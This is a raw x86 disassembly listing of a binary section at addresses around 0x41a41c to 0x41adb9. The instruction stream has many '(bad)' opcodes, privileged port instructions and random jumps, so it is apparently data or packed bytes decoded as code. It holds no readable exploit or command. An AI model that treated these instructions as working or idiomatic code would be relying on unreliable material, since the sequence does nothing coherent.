  41a41c:	test   BYTE PTR ds:[esp+esi*8-0x3],bh
  41a421:	push   ss
  41a422:	or     ah,BYTE PTR [ecx+0x6c2fe842]
  41a428:	arpl   WORD PTR [ecx+0x55],di
  41a42b:	jl     0x41a402
  41a42d:	mov    bl,0x92
  41a42f:	xchg   ch,al
  41a431:	push   ss
  41a432:	push   cs
  41a433:	pop    ds
  41a434:	scas   eax,DWORD PTR es:[edi]
  41a435:	dec    ecx
  41a436:	inc    BYTE PTR [ecx-0x22]
  41a439:	mov    esi,0x5800bfbe
  41a43e:	mov    ecx,0x87e990af
  41a443:	add    dl,BYTE PTR [ecx]
  41a445:	dec    eax
  41a446:	pop    eax
  41a447:	lahf   
  41a448:	imul   edi,DWORD PTR [ebp-0x6630a110],0x76
  41a44f:	loopne 0x41a433
  41a451:	retf   0xc105
  41a454:	data16 fldcw WORD PTR gs:[esi]
  41a458:	mov    ebp,0x4a89de64
  41a45d:	gs push esp
  41a45f:	mov    ebx,0xf6763af3
  41a464:	mov    dh,0x94
  41a466:	adc    ch,dh
  41a468:	aas    
  41a469:	in     al,0x1f
  41a46b:	push   eax
  41a46c:	push   ss
  41a46d:	mov    ecx,0x355cc2
  41a472:	pop    esp
  41a473:	test   BYTE PTR [esi],0x60
  41a476:	push   edx
  41a477:	adc    dl,dh
  41a479:	bound  ecx,QWORD PTR [esi]
  41a47b:	mov    edi,0xa7f283ff
  41a480:	push   edx
  41a481:	rcl    eax,0x17
  41a484:	add    al,0x5b
  41a486:	cmp    eax,0xf2b6b767
  41a48b:	test   al,0x71
  41a48d:	xor    eax,0x35353a7b
  41a492:	adc    ch,BYTE PTR [eax+eax*4+0x7556ace1]
  41a499:	sub    eax,0x6aa05fe1
  41a49e:	push   0x6c
  41a4a0:	dec    DWORD PTR [esi]
  41a4a2:	push   0x71
  41a4a4:	cmc    
  41a4a5:	mov    ebp,0x605f45b1
  41a4aa:	int    0xb6
  41a4ac:	add    BYTE PTR [edi-0x6e],dl
  41a4af:	outs   dx,DWORD PTR ds:[esi]
  41a4b0:	es stos DWORD PTR es:[edi],eax
  41a4b2:	cmp    eax,0x93b2ef4c
  41a4b7:	nop
  41a4b8:	cmp    al,0x4
  41a4ba:	mov    ds:0x17f14e28,eax
  41a4bf:	lahf   
  41a4c0:	rol    DWORD PTR [eax],0x0
	...
  41a533:	add    BYTE PTR [edi-0x9d722c],ch
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x61e9e0aa]
  41a541:	pop    ss
  41a542:	dec    edi
  41a543:	adc    ecx,DWORD PTR [esi]
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	and    DWORD PTR [edi+0x56f72326],ebx
  41a552:	push   0xfffffff2
  41a554:	retf   0x4d81
  41a557:	out    0xda,al
  41a559:	push   eax
  41a55a:	xor    al,0x93
  41a55c:	mov    ch,0xd
  41a55e:	sbb    DWORD PTR [esi+0x4c4d04ab],esi
  41a564:	out    dx,eax
  41a565:	(bad)  
  41a566:	jl     0x41a5ce
  41a568:	js     0x41a4ee
  41a56a:	in     eax,dx
  41a56b:	sahf   
  41a56c:	add    esi,ebx
  41a56e:	pop    ecx
  41a56f:	pusha  
  41a570:	mov    edx,DWORD PTR [edx+0x4e]
  41a573:	mov    ah,BYTE PTR [esi-0x15]
  41a576:	in     eax,dx
  41a577:	popa   
  41a578:	jb     0x41a57b
  41a57a:	or     ebp,DWORD PTR [edx-0x5b]
  41a57d:	dec    eax
  41a57e:	ret    
  41a57f:	shr    bh,cl
  41a581:	in     al,0xe0
  41a583:	dec    esp
  41a584:	push   ebp
  41a585:	push   ds
  41a586:	add    BYTE PTR [ebx],cl
  41a588:	out    0xee,eax
  41a58a:	mov    al,ds:0xe8aea606
  41a58f:	push   ebp
  41a590:	mov    ebx,edi
  41a592:	div    BYTE PTR [ecx]
  41a594:	mov    cl,0xab
  41a596:	mov    BYTE PTR [ebp+0x2e40e33b],dh
  41a59c:	(bad)  
  41a59e:	sar    BYTE PTR [ecx],1
  41a5a0:	push   ebp
  41a5a1:	mov    al,0x26
  41a5a3:	push   esp
  41a5a4:	ins    DWORD PTR es:[edi],dx
  41a5a5:	push   edx
  41a5a6:	sbb    al,0xa1
  41a5a8:	in     al,0x80
  41a5aa:	pop    ebx
  41a5ab:	adc    eax,0x50b873dc
  41a5b0:	push   ebp
  41a5b1:	arpl   WORD PTR [ebx-0xa],dx
  41a5b4:	and    eax,0xb57b1fd4
  41a5b9:	mov    edx,DWORD PTR [edx-0x4727c08d]
  41a5bf:	jp     0x41a581
  41a5c1:	ss stos DWORD PTR es:[edi],eax
  41a5c3:	add    eax,0x5fe81f3e
  41a5c8:	dec    ecx
  41a5c9:	hlt    
  41a5ca:	scas   eax,DWORD PTR es:[edi]
  41a5cb:	add    esp,DWORD PTR [eax-0x326f2092]
  41a5d1:	inc    edx
  41a5d2:	dec    edx
  41a5d3:	retf   
  41a5d4:	fadd   st(6),st
  41a5d6:	scas   eax,DWORD PTR es:[edi]
  41a5d7:	inc    edi
  41a5d8:	mov    bl,0xc4
  41a5da:	pop    edx
  41a5db:	loopne 0x41a646
  41a5dd:	icebp  
  41a5de:	mov    ah,0xc8
  41a5e0:	loope  0x41a58f
  41a5e2:	hlt    
  41a5e3:	dec    edi
  41a5e4:	ror    DWORD PTR [edi-0x2c747846],1
  41a5ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5eb:	ret    0x7148
  41a5ee:	cli    
  41a5ef:	inc    edx
  41a5f0:	dec    esi
  41a5f1:	xor    bh,BYTE PTR [ebx]
  41a5f3:	jp     0x41a5eb
  41a5f5:	out    dx,al
  41a5f6:	or     BYTE PTR [ebx],ch
  41a5f8:	sahf   
  41a5f9:	jnp    0x41a658
  41a5fb:	(bad)  
  41a5fc:	lds    edi,FWORD PTR [ebx]
  41a5fe:	cmp    ch,0x59
  41a601:	ret    
  41a602:	in     eax,dx
  41a603:	jmp    0x26ad00c0
  41a608:	test   al,0x38
  41a60a:	rcl    BYTE PTR [edx+0x28],cl
  41a60d:	push   0x2f7adb1f
  41a612:	jle    0x41a5e0
  41a614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a615:	cwde   
  41a616:	dec    eax
  41a617:	bound  edx,QWORD PTR [edx+0x14d0575a]
  41a61d:	jbe    0x41a5c6
  41a61f:	cs mov ch,0xe1
  41a622:	hlt    
  41a623:	ss jne 0x41a60a
  41a626:	inc    esp
  41a627:	ror    DWORD PTR [ecx],cl
  41a629:	mov    dl,0x47
  41a62b:	add    WORD PTR [edx+eax*4-0xb],ax
  41a630:	dec    edi
  41a631:	test   al,0xac
  41a633:	enter  0x4493,0xae
  41a637:	add    esp,DWORD PTR [edx]
  41a639:	mov    ?,WORD PTR [eax-0x7d]
  41a63c:	push   cs
  41a63d:	dec    edi
  41a63e:	pop    ds
  41a63f:	(bad)  
  41a640:	out    dx,eax
	...
  41a6b1:	add    BYTE PTR [eax],al
  41a6b3:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x83
  41a6c1:	jle    0x41a73d
  41a6c3:	fadd   QWORD PTR [ebx]
  41a6c5:	push   ds
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	cmc    
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    BYTE PTR [ebx],bh
  41a6cd:	mov    edx,0xb80572e0
  41a6d2:	mov    ecx,0xd8376b3e
  41a6d7:	pop    ebp
  41a6d8:	add    bl,BYTE PTR [ebx+0x3d]
  41a6db:	lock rcr DWORD PTR [ebp-0xf13b573],cl
  41a6e2:	pushf  
  41a6e3:	ret    
  41a6e4:	bound  eax,QWORD PTR [eax+eax*2]
  41a6e7:	bound  ebx,QWORD PTR [esi-0x32]
  41a6ea:	in     eax,dx
  41a6eb:	mov    edi,0x934011f2
  41a6f0:	lods   eax,DWORD PTR ds:[esi]
  41a6f1:	ret    0x7035
  41a6f4:	int3   
  41a6f5:	sub    edi,edi
  41a6f7:	dec    esp
  41a6f8:	(bad)  
  41a6f9:	retf   0xf2eb
  41a6fc:	mov    bh,0xc0
  41a6fe:	sub    BYTE PTR [edi-0x1ae5cf60],cl
  41a704:	ret    
  41a705:	cs push esp
  41a707:	imul   ebx,edi,0x336a3e22
  41a70d:	and    edi,DWORD PTR [ebp+0x4a]
  41a710:	dec    edx
  41a711:	fadd   QWORD PTR [ebp-0x4b]
  41a714:	cld    
  41a715:	xor    eax,0x6d90fe83
  41a71a:	xchg   ebx,eax
  41a71b:	dec    ebp
  41a71c:	cwde   
  41a71d:	add    eax,0x6fef65f4
  41a722:	mov    bh,0x33
  41a724:	push   0x2fafd790
  41a729:	dec    ebx
  41a72a:	imul   ebp,DWORD PTR [edx+0x6926ae7b],0x5e626cec
  41a734:	sub    edx,ebp
  41a736:	pop    eax
  41a737:	adc    bl,bh
  41a739:	mov    esi,0x7f246689
  41a73e:	test   BYTE PTR [edx+0x7a],bh
  41a741:	into   
  41a742:	fistp  WORD PTR [eax-0x19e51f2]
  41a748:	loop   0x41a72d
  41a74a:	sub    eax,0x5dcff440
  41a74f:	pop    es
  41a750:	jb     0x41a732
  41a752:	clc    
  41a753:	lods   al,BYTE PTR ds:[esi]
  41a754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a755:	mov    dh,cl
  41a757:	daa    
  41a758:	or     eax,0xbdababc1
  41a75d:	test   al,0x4d
  41a75f:	xor    al,0x7c
  41a761:	loope  0x41a6ef
  41a763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a764:	pop    ebp
  41a765:	mov    dh,0xc7
  41a767:	or     BYTE PTR [edx+0x27],ch
  41a76a:	push   ecx
  41a76b:	into   
  41a76c:	mov    ebx,0xde50f934
  41a771:	pushf  
  41a772:	sbb    DWORD PTR [ebx],esp
  41a774:	dec    edi
  41a775:	dec    ebp
  41a776:	pop    ecx
  41a777:	loop   0x41a78a
  41a779:	aaa    
  41a77a:	mov    esp,0x47926bae
  41a77f:	jmp    0x41a7ab
  41a781:	adc    dl,al
  41a783:	xchg   DWORD PTR [ebp+0x30],ebx
  41a786:	in     al,0x92
  41a788:	ds mov dl,0x9e
  41a78b:	xchg   esi,eax
  41a78c:	or     DWORD PTR [ecx-0x11d849cb],esp
  41a792:	mov    ?,eax
  41a794:	mov    ebp,0x3281014f
  41a799:	pop    ebx
  41a79a:	fldenv [ebp+0x52faa04c]
  41a7a0:	pop    ss
  41a7a1:	xchg   ebx,eax
  41a7a2:	jmp    0xf3aef115
  41a7a7:	repz mov bl,0x1d
  41a7aa:	fcmovbe st,st(4)
  41a7ac:	and    ah,bl
  41a7ae:	lods   al,BYTE PTR ds:[esi]
  41a7af:	in     al,0xb8
  41a7b1:	mov    al,ds:0xad828a65
  41a7b6:	ds hlt 
  41a7b8:	mov    bl,0x80
  41a7ba:	mov    dl,0x5e
  41a7bc:	out    0x38,al
  41a7be:	das    
  41a7bf:	hlt    
  41a7c0:	out    dx,eax
	...
  41a831:	add    BYTE PTR [eax],al
  41a833:	add    BYTE PTR [edx-0x201eb8e7],al
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a80a
  41a841:	(bad)  
  41a843:	(bad)  
  41a844:	clc    
  41a845:	push   ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	cmc    
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [ecx-0x54],ch
  41a84e:	pushw  ss
  41a850:	stos   BYTE PTR es:[edi],al
  41a851:	xor    esi,DWORD PTR [ebx]
  41a853:	mov    ecx,0x28601a81
  41a858:	repnz push es
  41a85a:	mov    edi,0x81c74d32
  41a85f:	inc    esp
  41a860:	js     0x41a840
  41a862:	add    DWORD PTR [eax],ebp
  41a864:	xchg   esi,eax
  41a865:	and    al,0x60
  41a867:	push   ebp
  41a868:	sbb    bl,BYTE PTR [ebx]
  41a86a:	cmp    BYTE PTR [esi+0x58],dh
  41a86d:	jno    0x41a86e
  41a86f:	mov    bl,0x22
  41a871:	add    eax,0x63a98655
  41a876:	fs gs mov dl,0x9e
  41a87a:	add    DWORD PTR [eax],edi
  41a87c:	dec    ebx
  41a87d:	push   esp
  41a87e:	sbb    bh,BYTE PTR [eax-0x3ab510b9]
  41a884:	dec    esp
  41a885:	xchg   edx,eax
  41a886:	fcmovnu st,st(2)
  41a888:	jae    0x41a8c0
  41a88a:	outs   dx,DWORD PTR ds:[esi]
  41a88b:	rol    edi,cl
  41a88d:	jae    0x41a861
  41a88f:	mov    edx,0xdc305389
  41a894:	div    WORD PTR [ecx+0x39]
  41a898:	mov    ebx,esp
  41a89a:	out    dx,eax
  41a89b:	dec    eax
  41a89c:	fisttp WORD PTR [ecx-0x3c]
  41a89f:	xchg   ebx,eax
  41a8a0:	out    dx,al
  41a8a1:	int3   
  41a8a2:	iret   
  41a8a3:	test   al,0xe5
  41a8a5:	outs   dx,BYTE PTR ds:[esi]
  41a8a6:	push   ebp
  41a8a7:	out    dx,eax
  41a8a8:	xchg   edi,eax
  41a8a9:	les    esi,FWORD PTR [esi+0x66c83cb1]
  41a8af:	in     al,0x4b
  41a8b1:	jno    0x41a901
  41a8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b4:	add    edi,ebx
  41a8b6:	adc    eax,DWORD PTR [eax]
  41a8b8:	aad    0x64
  41a8ba:	outs   dx,DWORD PTR ds:[esi]
  41a8bb:	rol    DWORD PTR ss:[ecx-0x64],1
  41a8bf:	jl     0x41a877
  41a8c1:	mov    dl,0x92
  41a8c3:	leave  
  41a8c4:	in     eax,dx
  41a8c5:	cmp    DWORD PTR [ebp-0x2fea052d],edx
  41a8cb:	mov    eax,ds:0x72fda169
  41a8d0:	jb     0x41a8db
  41a8d2:	jnp    0x41a94c
  41a8d4:	mov    ch,0xa8
  41a8d6:	and    edx,ebx
  41a8d8:	push   ds
  41a8d9:	in     eax,0x97
  41a8db:	xchg   esi,eax
  41a8dc:	scas   al,BYTE PTR es:[di]
  41a8de:	into   
  41a8df:	lock pop ds
  41a8e1:	mov    ch,0x3f
  41a8e3:	cmp    DWORD PTR [ebx+0x5c],esi
  41a8e6:	ds enter 0x3360,0x5d
  41a8eb:	xchg   dh,ch
  41a8ed:	int    0x51
  41a8ef:	mov    ecx,0x8efd8f8e
  41a8f4:	sub    BYTE PTR [eax-0x56b97316],dl
  41a8fa:	je     0x41a954
  41a8fc:	inc    eax
  41a8fd:	and    al,0xfb
  41a8ff:	je     0x41a8fa
  41a901:	ja     0x41a915
  41a903:	pop    ds
  41a904:	nop
  41a905:	scas   al,BYTE PTR es:[edi]
  41a906:	(bad)  
  41a907:	iret   
  41a908:	jmp    DWORD PTR [edx]
  41a90a:	sbb    ecx,DWORD PTR [edi]
  41a90c:	push   ebx
  41a90d:	dec    edi
  41a90e:	outs   dx,DWORD PTR ds:[si]
  41a910:	lea    esi,[ebx]
  41a912:	lods   al,BYTE PTR ds:[esi]
  41a913:	bound  edx,QWORD PTR [edx+0x61]
  41a916:	pop    ds
  41a917:	cli    
  41a918:	nop
  41a919:	call   0x44c0c3a4
  41a91e:	xlat   BYTE PTR ds:[ebx]
  41a91f:	stc    
  41a920:	xchg   ebp,eax
  41a921:	imul   eax,edi,0xffffffab
  41a924:	pop    esp
  41a925:	push   ds
  41a926:	pop    edx
  41a927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a928:	fld    QWORD PTR [esp+eax*1]
  41a92b:	loope  0x41a974
  41a92d:	jmp    0x41a8c2
  41a92f:	push   ss
  41a930:	xor    ebp,eax
  41a932:	and    dh,al
  41a934:	jp     0x41a977
  41a936:	jmp    0x41a965
  41a938:	adc    DWORD PTR [edi-0x24],ebp
  41a93b:	cmp    eax,0x68620713
  41a940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41a9b1:	add    BYTE PTR [eax],al
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx+0x7c9e3df1]
  41a9c1:	aaa    
  41a9c2:	sahf   
  41a9c3:	outs   dx,BYTE PTR ds:[esi]
  41a9c4:	in     eax,dx
  41a9c5:	pop    ds
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [edx+ebx*1+0x5b06cea9],al
  41a9d2:	sub    DWORD PTR [ebp+eiz*2-0x64047470],ebx
  41a9d9:	jmp    0x41aa47
  41a9db:	gs daa 
  41a9dd:	dec    ebp
  41a9de:	jb     0x41a9a4
  41a9e0:	popf   
  41a9e1:	rcl    BYTE PTR ds:0x7bdfb6c,cl
  41a9e7:	arpl   WORD PTR [eax],si
  41a9e9:	cwde   
  41a9ea:	or     al,0x33
  41a9ec:	cmp    DWORD PTR [ebx+0x7e],ebp
  41a9ef:	and    bl,0x7d
  41a9f2:	jle    0x41aa21
  41a9f4:	into   
  41a9f5:	jae    0x41aa13
  41a9f7:	(bad)  
  41a9f8:	cmp    BYTE PTR [edi],ah
  41a9fa:	mov    ebx,esi
  41a9fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9fd:	and    ch,ah
  41a9ff:	mov    bh,0x6f
  41aa01:	pop    es
  41aa02:	call   0x475d:0x46691fcc
  41aa09:	imul   esi,DWORD PTR [esi+ebp*1],0xffffff90
  41aa0d:	int3   
  41aa0e:	inc    ebp
  41aa0f:	xchg   edx,eax
  41aa10:	icebp  
  41aa11:	lods   eax,DWORD PTR ds:[esi]
  41aa12:	iret   
  41aa13:	sub    dh,BYTE PTR [esi-0x77]
  41aa16:	inc    eax
  41aa17:	clc    
  41aa18:	mov    esp,0xbedc6ac
  41aa1d:	icebp  
  41aa1e:	pusha  
  41aa1f:	jbe    0x41a9ad
  41aa21:	jge    0x41aa01
  41aa23:	and    eax,0x84cb2d28
  41aa28:	inc    ecx
  41aa29:	push   ecx
  41aa2a:	pop    esp
  41aa2b:	cmp    eax,0x394e6f52
  41aa30:	xchg   ecx,eax
  41aa31:	push   cs
  41aa32:	sub    dl,0xcf
  41aa35:	dec    BYTE PTR [edx+0x1d]
  41aa38:	sbb    eax,0x75e36c3c
  41aa3d:	pusha  
  41aa3e:	in     eax,0xdb
  41aa40:	cvtps2pi mm6,QWORD PTR [ecx]
  41aa43:	mov    bl,0x11
  41aa45:	lea    eax,[edi+0x4e]
  41aa48:	mov    dh,0xa1
  41aa4a:	push   es
  41aa4b:	int3   
  41aa4c:	pop    ebp
  41aa4d:	xor    BYTE PTR [eax+0x7c],cl
  41aa50:	mov    cl,0xa8
  41aa52:	imul   edi,DWORD PTR [ebx+ebx*4],0x85d21324
  41aa59:	pop    ebp
  41aa5a:	repz add eax,0x31c28ee
  41aa60:	xchg   ecx,eax
  41aa61:	or     ah,BYTE PTR [edx+0x65]
  41aa64:	jge    0x41aa9d
  41aa66:	or     ch,BYTE PTR [ecx+0x4bf4ef61]
  41aa6c:	inc    esp
  41aa6d:	cmp    esp,edx
  41aa6f:	out    0x5e,eax
  41aa71:	pop    eax
  41aa72:	cmp    al,0xd2
  41aa74:	xor    ax,0xf468
  41aa78:	and    esp,edx
  41aa7a:	rcr    DWORD PTR fs:[edx+edx*1-0x574004a8],0x4e
  41aa83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa84:	and    DWORD PTR [eax+0x3d],ebp
  41aa87:	xchg   BYTE PTR [eax],dh
  41aa89:	xor    BYTE PTR [edi-0x4e],dl
  41aa8c:	fs mov edi,0x765e73e1
  41aa92:	jns    0x41aaaa
  41aa94:	ss cwde 
  41aa96:	or     ebp,DWORD PTR [ebp-0xd8916fa]
  41aa9c:	imul   ebp,DWORD PTR [esi-0x690f3030],0xde7255ff
  41aaa6:	(bad)  
  41aaa8:	outs   dx,DWORD PTR ds:[esi]
  41aaa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaaa:	in     eax,0x87
  41aaac:	stos   BYTE PTR es:[edi],al
  41aaad:	jb     0x41aa32
  41aaaf:	stc    
  41aab0:	pop    edx
  41aab1:	jno    0x41aabb
  41aab3:	jns    0x41aac8
  41aab5:	pop    ebx
  41aab6:	enter  0x9736,0xea
  41aaba:	test   DWORD PTR [ebp-0x66],0x65ebbd8c
	...
  41ab31:	add    BYTE PTR [eax],al
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x19]
  41ab41:	sahf   
  41ab42:	sar    DWORD PTR [edi-0x1e],1
  41ab45:	and    BYTE PTR [ecx],al
  41ab47:	add    ch,dh
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR [ebp+0x4391ada2],dl
  41ab51:	mov    edi,0x559f51a5
  41ab56:	cmc    
  41ab57:	xchg   ebx,eax
  41ab58:	jl     0x41ab60
  41ab5a:	mov    esi,0x80ccab0b
  41ab5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab60:	push   ds
  41ab61:	mov    ds:0x5fdf3ce0,eax
  41ab66:	fwait
  41ab67:	xor    eax,0x89c1edd7
  41ab6c:	mov    bl,BYTE PTR [edx]
  41ab6e:	pusha  
  41ab6f:	cmp    edi,edx
  41ab71:	ret    0x7daf
  41ab74:	jne    0x41ab6e
  41ab76:	repz cli 
  41ab78:	loop   0x41ab24
  41ab7a:	clc    
  41ab7b:	(bad)  
  41ab7c:	fmul   QWORD PTR [eax]
  41ab7e:	mov    edx,0xc5b082f6
  41ab83:	out    dx,al
  41ab84:	fwait
  41ab85:	(bad)  
  41ab87:	shl    BYTE PTR [ecx+0x48],cl
  41ab8a:	(bad)  [edi+eax*1-0x72]
  41ab8e:	ins    DWORD PTR es:[edi],dx
  41ab8f:	xor    eax,0x4a1f021c
  41ab94:	mov    edx,DWORD PTR [ecx]
  41ab96:	clc    
  41ab97:	in     eax,dx
  41ab98:	adc    BYTE PTR [ebx],0x80
  41ab9b:	mov    ch,dl
  41ab9d:	mov    cl,0xdd
  41ab9f:	ss cmp dl,ch
  41aba2:	or     ch,BYTE PTR [edx+0x31]
  41aba5:	scas   al,BYTE PTR es:[edi]
  41aba6:	jmp    0x8a450f3
  41abab:	and    ebx,DWORD PTR [ebx]
  41abad:	rcr    BYTE PTR [edi],1
  41abaf:	bnd call 0x2a0e2330
  41abb5:	jg     0x41abab
  41abb7:	mov    esp,0x28445151
  41abbc:	fadd   QWORD PTR [edi-0x14]
  41abbf:	in     al,dx
  41abc0:	scas   al,BYTE PTR es:[edi]
  41abc1:	fucomi st,st(0)
  41abc3:	dec    ecx
  41abc4:	mov    DWORD PTR [esi+0x3a],ebx
  41abc7:	dec    BYTE PTR [eax]
  41abc9:	call   0xe89e:0xb01724e5
  41abd0:	or     eax,0xd47f0200
  41abd5:	inc    ecx
  41abd6:	out    dx,eax
  41abd7:	add    eax,DWORD PTR [ecx-0x2d70b5cc]
  41abdd:	cmp    BYTE PTR [edi],ah
  41abdf:	rcr    DWORD PTR [eax],0x3e
  41abe2:	push   ebp
  41abe3:	jbe    0x41ab7a
  41abe5:	push   cs
  41abe6:	inc    edx
  41abe7:	inc    ebp
  41abe8:	and    BYTE PTR [edx],bl
  41abea:	dec    edx
  41abeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abec:	test   DWORD PTR [ebp+0x7e],esi
  41abef:	aas    
  41abf0:	pop    edx
  41abf1:	xor    dl,BYTE PTR [ebx-0x75ca31e5]
  41abf7:	into   
  41abf8:	fiadd  DWORD PTR [esi+0x35]
  41abfb:	xlat   BYTE PTR ds:[ebx]
  41abfc:	out    dx,eax
  41abfd:	jno    0x41abf8
  41abff:	mov    cl,0x9a
  41ac01:	mov    bl,0x27
  41ac03:	sub    cl,BYTE PTR [esi+0x42be43c]
  41ac09:	xor    DWORD PTR [ebp-0x77],ecx
  41ac0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac0d:	inc    eax
  41ac0e:	dec    eax
  41ac0f:	dec    edx
  41ac10:	xor    BYTE PTR [ebp-0x6],bl
  41ac13:	ja     0x41ac21
  41ac15:	xchg   esp,eax
  41ac16:	dec    eax
  41ac17:	push   ebx
  41ac18:	sahf   
  41ac19:	sub    BYTE PTR [eax-0x5d],bl
  41ac1c:	popa   
  41ac1d:	test   al,0xc4
  41ac1f:	loopne 0x41abcf
  41ac21:	adc    esp,DWORD PTR [edx]
  41ac23:	push   0x20e2f7d1
  41ac28:	in     al,dx
  41ac29:	mov    WORD PTR [ebx],fs
  41ac2b:	out    0xed,eax
  41ac2d:	xchg   bl,dl
  41ac2f:	std    
  41ac30:	test   eax,0x8d3295a5
  41ac35:	aam    0x30
  41ac37:	mul    DWORD PTR [ecx-0x8]
  41ac3a:	test   BYTE PTR [esi+ecx*4+0x73],bh
  41ac3e:	pop    esp
  41ac3f:	jmp    0x41ac4f
	...
  41acb1:	add    BYTE PTR [eax],al
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xe70f3002
  41acc3:	push   edx
  41acc4:	xlat   BYTE PTR ds:[ebx]
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    dl,al
  41accd:	xor    edi,DWORD PTR [ebx]
  41accf:	add    eax,0x24df7ecb
  41acd4:	add    al,0xb9
  41acd6:	xor    eax,0x8c70e569
  41acdb:	mov    bl,ah
  41acdd:	fisub  WORD PTR [ebp-0x2c]
  41ace0:	pop    edx
  41ace1:	add    BYTE PTR [ebx],0x45
  41ace4:	shl    esp,1
  41ace6:	sbb    ah,ah
  41ace8:	jb     0x41ac87
  41acea:	add    BYTE PTR [esi+0x7a],bl
  41aced:	pushf  
  41acee:	mov    al,ds:0xd310995e
  41acf3:	scas   al,BYTE PTR es:[edi]
  41acf4:	scas   eax,DWORD PTR es:[edi]
  41acf5:	pop    DWORD PTR [edx]
  41acf7:	pop    eax
  41acf8:	xchg   esi,eax
  41acf9:	ins    BYTE PTR es:[edi],dx
  41acfa:	mov    ch,0xd8
  41acfc:	adc    dh,BYTE PTR [esi+0x13f6b48a]
  41ad02:	jl     0x41acaf
  41ad04:	popf   
  41ad05:	lea    esi,[edi]
  41ad07:	gs or  eax,0xbf069e5a
  41ad0d:	int    0x2a
  41ad0f:	sub    ebp,DWORD PTR [edx+eiz*4-0x6b3b1b2e]
  41ad16:	ret    0xd9d
  41ad19:	add    eax,0x83b4861e
  41ad1e:	and    BYTE PTR [esi+0x62],dl
  41ad21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad22:	adc    BYTE PTR [ebx+edx*1],dh
  41ad25:	cmc    
  41ad26:	mov    dl,BYTE PTR [eax]
  41ad28:	cld    
  41ad29:	clc    
  41ad2a:	dec    eax
  41ad2b:	mov    DWORD PTR [esi-0x152acdb4],edi
  41ad31:	neg    BYTE PTR [esi]
  41ad33:	pop    edx
  41ad34:	jle    0x41acf9
  41ad36:	aam    0x51
  41ad38:	out    dx,al
  41ad39:	mov    ch,0xe1
  41ad3b:	jle    0x41ad54
  41ad3d:	mov    edi,0x7762369
  41ad42:	and    esp,DWORD PTR [eax]
  41ad44:	push   ebp
  41ad45:	aad    0x19
  41ad47:	push   cs
  41ad48:	push   0x44
  41ad4a:	push   esi
  41ad4b:	mov    dl,0x5c
  41ad4d:	test   BYTE PTR [edi-0x3c],cl
  41ad50:	add    al,0x3c
  41ad52:	push   ebp
  41ad53:	mov    BYTE PTR [edi-0x57],0x97
  41ad57:	aam    0xc0
  41ad59:	rcl    DWORD PTR [ebp-0x7f92656f],0x5f
  41ad60:	imul   ebx,DWORD PTR [ecx-0xa9792e1],0xee86cd79
  41ad6a:	dec    ebx
  41ad6b:	mov    ?,WORD PTR [ebp+0x73ffbb71]
  41ad71:	test   esp,eax
  41ad73:	ret    0x80d6
  41ad76:	fstp   TBYTE PTR [esp+eax*8+0x50]
  41ad7a:	push   esi
  41ad7b:	cmp    esp,DWORD PTR [ebx]
  41ad7d:	sub    DWORD PTR [esp+ebx*2-0x5a],ebx
  41ad81:	cmp    BYTE PTR [ecx],0x2d
  41ad84:	or     ax,0xd040
  41ad88:	out    0x6b,al
  41ad8a:	sti    
  41ad8b:	aam    0xc3
  41ad8d:	out    0xd6,eax
  41ad8f:	push   ebx
  41ad90:	out    dx,eax
  41ad91:	ret    0xace0
  41ad94:	and    ecx,DWORD PTR [ebx-0x27b7af3f]
  41ad9a:	out    0xde,eax
  41ad9c:	mov    ?,ebx
  41ad9e:	sbb    edi,ebx
  41ada0:	dec    ecx
  41ada1:	ss (bad) 
  41ada4:	int3   
  41ada5:	push   es
  41ada6:	scas   eax,DWORD PTR es:[edi]
  41ada7:	loop   0x41adba
  41ada9:	(bad)  
  41adaa:	ficomp DWORD PTR [eax-0x4e613bba]
  41adb0:	mov    DWORD PTR [edi],ebp
  41adb2:	mov    bl,0xe9
  41adb4:	sar    BYTE PTR [esi],cl
  41adb6:	retf   
  41adb7:	sub    esp,DWORD PTR [ecx]
  41adb9:	sub    ebx,ecx
